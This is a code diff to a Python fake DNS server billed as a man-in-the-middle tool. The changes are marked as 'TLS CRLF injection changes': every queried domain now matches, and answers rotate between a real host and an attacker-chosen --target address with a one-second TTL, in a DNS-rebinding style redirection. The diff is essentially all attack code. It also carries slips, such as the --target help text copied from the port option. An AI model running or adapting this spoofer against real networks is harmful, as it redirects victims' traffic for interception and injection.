@@ -11,12 +11,15 @@ import dnslib
 import argparse
 import re
 import os
+from time import time
 
 
 parser = argparse.ArgumentParser(
     description="A fake DNS server to easily MitM devices that you control"
 )
 parser.add_argument('-p', '--port', default=53, dest="PORT", type=int,
+    help="the UDP port to listen on (default: 53)")
+parser.add_argument('-t', '--target', default='127.0.0.1', dest="TARGET", type=str,
     help="the UDP port to listen on (default: 53)")
 parser.add_argument('-b', '--bind-address', default='',
     dest="BIND_ADDRESS", type=str,
@@ -76,13 +79,23 @@ def sendData(udps, addr, answer):
 # The TLS CRLF injection changes start here
 
 spoof_count = 0
+start = time()
+last_ip = None
 
-def get_spoofed_IP(domain):
+def get_spoofed_IP(domain, ip):
     global spoof_count
+    global start
+    global last_ip
+    start = time()
+    last_ip = ip
+
     for d in HOSTS_LIST:
-        if re.match(d[0], domain):
-            spoof_count = (spoof_count + 1) % 2
-            return d[1] if spoof_count else '127.0.0.1'
+        if re.match(d[0], domain.lower()) or True:
+            spoof_count = (spoof_count + 1) % 3
+            # The below line will result in the answer switching after 30 seconds,
+            # instead of alternating
+            # return d[1] if (time() - start > 30) else args.TARGET
+            return d[1] if spoof_count == 0 else args.TARGET
     return None
 
 # end
@@ -115,7 +128,7 @@ def forwarded_dns_request(data):
 
 def spoofed_answer(answer, domain, IP):
     answer.add_answer(
-        *dnslib.RR.fromZone('%s 0 %s %s' % (
+        *dnslib.RR.fromZone('%s 1 %s %s' % (
             domain,
             "A",
             IP)
@@ -126,7 +139,7 @@ def spoofed_answer(answer, domain, IP):
 def main_loop(udps):
     while True:
         data, addr, type, domain, answer = receiveData(udps)
-        ip = get_spoofed_IP(domain)
+        ip = get_spoofed_IP(domain, addr)
         if type == "A" and ip:
             print("Answering with %s" % ip)
             answer = spoofed_answer(answer, domain, ip)
